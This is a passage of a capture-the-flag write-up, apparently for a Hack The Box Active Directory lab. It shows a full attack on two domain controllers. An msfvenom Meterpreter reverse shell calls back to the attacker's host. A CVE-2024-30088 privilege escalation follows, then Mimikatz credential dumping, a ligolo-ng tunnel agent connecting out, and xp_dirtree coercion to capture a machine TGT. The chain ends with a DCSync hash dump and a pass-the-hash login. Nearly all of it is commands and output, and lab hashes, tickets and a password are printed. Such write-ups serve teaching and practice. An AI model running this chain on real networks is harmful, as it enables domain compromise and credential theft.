msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.14 LPORT=4444 -f exe -o rev.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.14
LHOST => 10.10.16.14
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.14:4444 
[*] Sending stage (203846 bytes) to 10.129.40.134
[*] Meterpreter session 2 opened (10.10.16.14:4444 -> 10.129.40.134:54589) at 2025-10-05 21:33:12 +0300
```

You need to upload you payload to `DC01` then execute it in order to get a session in meterpreter listener.

```bash
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  2         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.16.14:4444 -> 10.129.40.134:54589 (172.16.20.2)

msf6 exploit(multi/handler) > use multi/recon/local_exploit_suggester
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 172.16.20.2 - Collecting local exploits for x64/windows...
[*] 172.16.20.2 - 205 exploit checks are being tried...

[SNIP]


 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

We get nine potential exploits. this one worked for me, `exploit/windows/local/cve_2024_30088_authz_basep`.

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_30088_authz_basep
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.16.14
LHOST => 10.10.16.14
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set session 2
session => 2
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > show options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.14      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/cve_2024_30088_authz_basep) > set AutoCheck false
AutoCheck => false
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.16.14:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Reflectively injecting the DLL into 2280...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 848
[+] Successfully retrieved winlogon pid: 604
[*] Sending stage (203846 bytes) to 10.129.40.134
[*] Meterpreter session 3 opened (10.10.16.14:4444 -> 10.129.40.134:54598) at 2025-10-05 21:59:17 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```


We have full privileges in `DC02` we need to find a way to pivot to `DC01`. First of all we know that there is a bidirectional trust between the two domains. Both `DC01` and `DC02` are trusted for delegation. Let's just keep that in mind.

#### Retrieving password hashes

Am trying to see if we can logon to `dc01` as `dc02` or the administrator from `dco2`

```bash
mimikatz # sekurlsa::logonpasswords   

Authentication Id : 0 ; 2555063 (00000000:0026fcb7)
Session           : Batch from 0
User Name         : Administrator
Domain            : darkzero-ext
Logon Server      : DC02
Logon Time        : 10/6/2025 5:35:20 AM
SID               : S-1-5-21-1969715525-31638512-2552845157-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : darkzero-ext
	 * NTLM     : 6963aad8ba1150192f3ca6341355eb49
	 * SHA1     : 93564754ec637caa92a4a9b7e8fc080a7f9fe8bb
	 * DPAPI    : 07f02ffc631a34deccda1490a397d2b4
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : darkzero-ext
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : DARKZERO.EXT
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2456429 (00000000:00257b6d)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/6/2025 5:19:40 AM
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : DC02$
	 * Domain   : darkzero-ext
	 * NTLM     : 663a13eb19800202721db4225eadc38e
	 * SHA1     : be3d502f8be10e1c8731103e904fd3f34b89eaeb
	 * DPAPI    : be3d502f8be10e1c8731103e904fd3f3
	tspkg :	
	wdigest :	
	 * Username : DC02$
	 * Domain   : darkzero-ext
	 * Password : (null)
	kerberos :	
	 * Username : DC02$
	 * Domain   : darkzero.ext
	 * Password : a8 e1 9b 6a 34 5f 5f d4 10 5c 5e 66 c3 53 ed dd 7b 57 01 1d ab b7 ae d7 11 ca 85 49 fc 3b 51 2b 12 9a e6 65 19 ff 51 43 b9 ea 9e 50 72 39 4d 69 11 5a 9d 06 36 79 41 31 17 e4 da d2 38 76 cd 52 aa 46 2a 08 bb 41 38 23 8e 3b dc 01 e2 73 83 1c 14 b3 f2 20 27 03 3e fd c7 34 29 5b af 30 76 11 e5 a1 9f 55 d5 eb 58 08 c1 a6 90 a0 28 b1 9d be 0c a6 ef 4d 75 fe 86 4f 91 03 81 50 05 fc e4 1b d7 54 60 1e 55 25 da 29 b9 20 01 ec 17 5c 8c c5 31 88 ef bf 68 06 11 4b b2 7a b2 f2 8e 67 37 ed 82 ab d5 e1 c8 83 f0 2b 65 d6 2c 34 c2 65 9c 8f e8 d8 19 0b 48 23 1d b9 a5 4e 2f 94 41 45 eb f9 e7 0a 26 0d a9 3c 64 05 2c ce fe 55 ff 63 9f 26 eb e2 47 0e 46 25 8e 46 b6 dd df 69 d3 bd fa 8f 9d 38 7c 95 1a 8c c6 ab 3e 72 58 39 b7 30 53 8f 
	ssp :	
	credman :	
```


#### Pivoting 

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ sudo ip tuntap add user darklight mode tun ligolo
[sudo] password for darklight: 
                                                                                
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ sudo ip link set ligolo up
                                                                                
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ chmod +x proxy
                                                                               
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ ./proxy -selfcert      
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0005] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0005] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0005] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng »
```

Then upload the ligolo agent to the target system.

```powershell
C:\Windows\TEMP>agent.exe -connect 10.10.16.14:11601 -ignore-cert
agent.exe -connect 10.10.16.14:11601 -ignore-cert
time="2025-10-06T06:25:34-07:00" level=warning msg="warning, certificate validation disabled"
time="2025-10-06T06:25:35-07:00" level=info msg="Connection established" addr="10.10.16.14:11601"
```

We receive a connection 

```bash
ligolo-ng » session
? Specify a session : 1 - NT AUTHORITY\SYSTEM@DC02 - 10.129.123.79:56533 - 00155df25c01

[Agent : NT AUTHORITY\SYSTEM@DC02] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet                       │
│ Hardware MAC │ 00:15:5d:f2:5c:01              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.20.2/24                 │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 1                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
```

```bash
sudo ip route add 172.16.20.0/24 dev ligolo 
[sudo] password for darklight: 
```

Finally we start tunneling.

```bash
[Agent : NT AUTHORITY\SYSTEM@DC02] » start
INFO[0341] Starting tunnel to NT AUTHORITY\SYSTEM@DC02 (00155df25c01) 
```

#### Port scan 

```bash
nmap -sT -Pn 172.16.20.2                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 09:32 EAT
Nmap scan report for 172.16.20.2
Host is up (0.24s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 29.05 seconds
```


Verifying the hashes we extracted earlier 

```bash
nxc smb 172.16.20.2 -u 'Administrator' -H 6963aad8ba1150192f3ca6341355eb49
SMB         172.16.20.2     445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:False) 
SMB         172.16.20.2     445    DC02             [+] darkzero.ext\Administrator:6963aad8ba1150192f3ca6341355eb49 (Pwn3d!)
```

next i will get a ticket then try to authenticate using the ticket to `DC01`

```bash
faketime -f "+7hrs" \
> impacket-getTGT darkzero.ext/Administrator: -hashes :6963aad8ba1150192f3ca6341355eb49
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache 
```

Trying to list shares i get this.

```bash
nxc smb DC01.darkzero.htb -k --shares                              
SMB         DC01.darkzero.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         DC01.darkzero.htb 445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

> [!Info]
> The server MUST look up the **Session** in **Connection.SessionTable** by using the **SessionId** in the SMB2 header of the request. If **SessionId** is not found in **Connection.SessionTable**, the server MUST fail the request with STATUS_USER_SESSION_DELETED.

I couldn't get around this. Maybe the session is created then immediately deleted or the session is not created at all.

#### Ticket enumeration and monitoring

```bash
C:\Windows\TEMP>rubeus.exe triage
rubeus.exe triage

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 --------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                     | Service                             | EndTime               |
 --------------------------------------------------------------------------------------------------------- 
 | 0x2ef5f8 | Administrator @ DARKZERO.EXT | krbtgt/DARKZERO.EXT                 | 10/6/2025 5:05:20 PM  |
 | 0x57c30  | DC02$ @ DARKZERO.EXT         | GC/DC02.darkzero.ext/darkzero.ext   | 10/6/2025 9:09:15 AM  |
 | 0x4374e  | Administrator @ DARKZERO.EXT | krbtgt/DARKZERO.EXT                 | 10/6/2025 9:18:15 AM  |
 | 0x297bc  | svc_sql @ DARKZERO.EXT       | krbtgt/DARKZERO.EXT                 | 10/6/2025 9:10:54 AM  |
 | 0x289ec  | DC02$ @ DARKZERO.EXT         | krbtgt/DARKZERO.EXT                 | 10/6/2025 9:09:15 AM  |
 | 0x22829  | DC02$ @ DARKZERO.EXT         | LDAP/DC02.darkzero.ext/darkzero.ext | 10/6/2025 9:09:15 AM  |
 | 0x22695  | DC02$ @ DARKZERO.EXT         | ldap/DC02.darkzero.ext              | 10/6/2025 9:09:15 AM  |
 | 0x224b9  | DC02$ @ DARKZERO.EXT         | ldap/DC02.darkzero.ext              | 10/6/2025 9:09:15 AM  |
 | 0x3e4    | dc02$ @ DARKZERO.EXT         | krbtgt/DARKZERO.EXT                 | 10/6/2025 10:08:44 AM |
 | 0x3e4    | dc02$ @ DARKZERO.EXT         | DNS/dc02.darkzero.ext               | 10/6/2025 10:08:44 AM |
 | 0x274c0  | DC02$ @ DARKZERO.EXT         | LDAP/DC02.darkzero.ext/darkzero.ext | 10/6/2025 9:09:15 AM  |
 | 0x22fb1  | DC02$ @ DARKZERO.EXT         | ldap/DC02.darkzero.ext              | 10/6/2025 9:09:15 AM  |
 | 0x22765  | DC02$ @ DARKZERO.EXT         | ldap/DC02.darkzero.ext              | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | krbtgt/DARKZERO.HTB                 | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | cifs/DC02.darkzero.ext/darkzero.ext | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | GC/DC02.darkzero.ext/darkzero.ext   | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | ldap/dc01.darkzero.htb/darkzero.htb | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | cifs/DC02                           | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | DC02$                               | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | LDAP/DC02.darkzero.ext/darkzero.ext | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | ldap/DC02.darkzero.ext              | 10/6/2025 9:09:15 AM  |
 | 0x3e7    | dc02$ @ DARKZERO.EXT         | LDAP/DC02                           | 10/6/2025 9:09:15 AM  |
 --------------------------------------------------------------------------------------------------------- 
```

Most are service tickets for services running on `DC02`

Monitoring kerberos activities

```bash
C:\Windows\TEMP>rubeus.exe monitor /interval:2 /nowrap
rubeus.exe monitor /interval:2 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 2 seconds for new TGTs


[*] 10/6/2025 2:36:56 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/5/2025 11:18:15 PM
  EndTime               :  10/6/2025 9:18:15 AM
  RenewTill             :  10/12/2025 11:18:15 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIF7DCCBeigAwIBBaEDAgEWooIE7DCCBOhhggTkMIIE4KADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEpDCCBKCgAwIBEqEDAgECooIEkgSCBI53D9TDfedCjz38YAYsEw3SGidE7ZTqJxoUVPCyQewigMT2p3CPHv/hg+6G+TK3i9faWiizfaej1N7CzaAu6BAMktMXaepo+5w/j4McTCDX6lYjS/dXuEPJPbjXIy7jXIdum4POl8CY+0o4CRlFMSTHsVdBW0IHayoBt0zGcTC5l8tCozLZ2/pmMTPGrLb3AreScEuDS4836NEix3stH7a7Gu3DAxkWJWT9kmRUZsT+c0/7JPK18k23IvbgG9lMCUAJ5kECkDZ7NnRwygTcW0yPJ0uzRgUcJsWe+Sd79Sc5JHwR3C1tz9CAOxUVCvr/5fB6WD3qidX/6Ova34HtR5eJ5LSA0/Xl/V71XG2zupUOPle8lT9sQ4qf2OZfW94JwRs/CkQpFvu3PcxzjAfrH3SJBoqjvR07e84r7vwTHF+SRyqUZhB87x76Oo2oRkwczkjc+Opwtrbqlw5jJwr997vB/OEIRYcI2YLGKaqKqo7BM9xwYb2vbm+qU3qW4ub7YVrrttWI897o6CKODOip3E7Z9fvQUWffHq93k5CtBs7CCtJU8J8IoU3LI++IcZZzN4yJcy+ayb1u1mfw7OtXmdRc3ov4AKeAKBCh2SLy1bBXueW/KfljwU+yTDgu9oh32lpxxtkK8oXs

[SNIP]
```

 I get multiple TGT but they are all fro `DC02`

Triggering authentication to `DC02`

```bash
impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.123.79 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\hellouyufuyf
subdirectory   depth   file   
------------   -----   ----   
SQL (darkzero\john.w  guest@master)> 
```

Am using `xp_dirtree` to try and access SMB share that does not exist on `DC02`. This will in turn trigger authentication where the sql process will request for a TGS in order to access the SMB service on `DC02`. When requesting for the TGS it will present its TGT to `DC02` which results to us having the the ticket since we are monitoring the kerberos activities. 

```bash
[*] 10/6/2025 2:42:13 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/6/2025 7:42:12 AM
  EndTime               :  10/6/2025 5:42:12 PM
  RenewTill             :  10/13/2025 7:42:12 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDY0dnn5kJX58GyNJjR/tHV7IHlLVB0PaqgHXYZyaEmKgFA3rRYJtCiHV3ZVKcLH5F1WOHhyhtZF3ja8Y0wgS6ZHURCrFEaXiSImS6NikcU85LtnfQJ5nzvOnc8t0P8AjPwYwaEddKs/U7uD1/gCi7+T3rzdDGScnLLVZp2JnAjy7EJTJShsv4bM0rxJToXfmdzS/iYqJB7FX7mi4u1LAxZkhYtzuSy/kQoPApDpPRZHbwZqzKg9DcUSKK1sGK7yS0+LLcFCW0ylZc/QIEjt71webmnWa1F3k7eUk9WIOvMulYIpvWsHJ66AQSfJb5EKDjGwKjIZwgB6FoDLlxuBFwA6ghnd/kWoQ3H3CbleVMSAaBCgZoeEwuidEEyO1rkLlmml/+I9rxtqtq/6PgpfJTXZfnBeKnxI1kCJRcHgXHQiL/Fl3JRZwHvPu+qyLtyOWXW0cpHSEm6qW0v9giMR0BE3H3gfDwyL3OgozgxP4s3fKLYvYmhcwOlg7WX0f2IkioTgpLo3QTIdHgZ6WeEJSsvCKXWruUBCBUOsTELFKtYMtQqcrAEpA02y+VTomByD597NyjdxCG0sTPQ9SurhKB0AHKvV7DNT9hP1QNErN1YQ3LDcdbIZSwLpHQhawRzurvoUcNOizJtxVzwt0IYoUX903ErHsr9R/1OXO6rds5gZoyxa/GxMSuis3Knz8jeX182LF6ETL6IHXTI5EDGvSRXlDAHP4K9Al/4ZAUOI+6nCPOuNN3NgW7QvDRGNuJJmMV0LoKv+0WPSi/vXtyenHligDqcyx1RtIXJRGcEBVpYGqS5BFgedvmTj7AjOgHJUri0CeS87WtLujh9m2k4dBreKMDTBb6HKNFm2d6R4iA30L0ZKbnyP2F3K8d6rrHzV+eKx1hlV1NtZTKe5LdjaVQ9exUzUquz42P0yZvYqDPUaI5V0gyYnf611hselIGYybvHAwKOjzBZfzFPqrpo84vwLgYnYDHae1dDGBuhQ8jdM5+sLXeJ+ETjhecBANhHcyE8eg4Qu1GPW5+RFGBr5xNCRAWHUoaFrJ4GD3H62x7U/C8TQ4E/sBwvv1vbNJSuMrSLNXi39DONEBvPNl1/3bWOsBVnuPijeRgawdGlTRWaJ7+72C4FNoa3x/F1FvxG9YmnKBP1GDzoylZ7/C5kZmRqnjms3+yjhi+2n2m85HNfi+Z2Ja9Abfes3aonb7X8Mqp544eVp/z1AOiOEdfBGSNSV0A1YXECiJlhH7ZJUIlHnN/B2K2JWwZ67d8osAQnPARlc8jIj9F0yLAfBTQI6LvGHUiC20uJB7OfQpBfpg+trEwOz/fTTf2C6ozN7O3SOlAqkwzNVIhZ0CO3FAIXbp1DBC5nV18/LzBuawmosZdnyqX0kE0hfNU/Hf8aopbgilJ55GuN1DycHgqB3PTO/+tuMwn5X1wKoo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgbrItbZKSZ5HMWuugdp3b4yMhAg77xDIUqQlYNIj+huqhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDYxNDQyMTJaphEYDzIwMjUxMDA3MDA0MjEyWqcRGA8yMDI1MTAxMzE0NDIxMlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
```




> [!question]
> Why we getting TGT for `DC01` ??
> 
> When I run `xp_dirtree \\DC02\…` on `DC01`, the SQL Server process on `DC01`—not the remote user who connected to SQL,`john.w` —initiates the outbound SMB connection, so the identity presented to `DC02 `is whatever account the SQL process uses for network authentication. In this case that was the `DC01 `machine account, which is why Rubeus monitoring on `DC02` reported `DC01$@DARKZERO.HTB`; services running as `LocalSystem` or `NetworkService` use the computer account for outbound Kerberos auth, and if the service is running under a domain service account it will use that account instead. For the SQL process to present the original caller’s credentials (for example `john.w`) the service must be configured and allowed to delegate the user’s Kerberos ticket (constrained/unconstrained delegation or S4U proxy), which is not automatic—without delegation the server falls back to its own process identity. You can confirm the behavior by checking the SQL service "Log On As" and the process owner on DC01 (`Get-CimInstance Win32_Service -Filter "Name='MSSQLSERVER'" | Select Name,StartName` and `Get-Process -Name sqlservr -IncludeUserName`).


Save the base64 encoded ticket then base64 decode it and convert it to .ccache

```bash
 echo 'doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+g
 [SNIP]
hAAClERgPMjAyNTEwMDYxNDQyMTJaphEYDzIwMjUxMDA3MDA0MjEyWqcRGA8yMDI1MTAxMzE0NDIxMlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=' > ticket.bs64.kirbi
                                                                                              
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ cat ticket.bs64.kirbi | base64 -d | tee ticket.kirbi
```


Convert ticket.

```bash
impacket-ticketConverter ticket.kirbi dc01.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Export the the ticket.

I could not establish a connection using `psexec` or `wmiexec`. 

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ faketime -f "+7hrs" \
impacket-wmiexec -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED
                                                                                              
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/darkzero]
└─$ faketime -f "+7hrs" \
impacket-psexec -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.darkzero.htb.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

But we have the option t dump all users' hashes.

```bash
faketime -f "+7hrs" \
> impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up... 
```

```bash
└─$ evil-winrm -i DC01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
darkzero\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

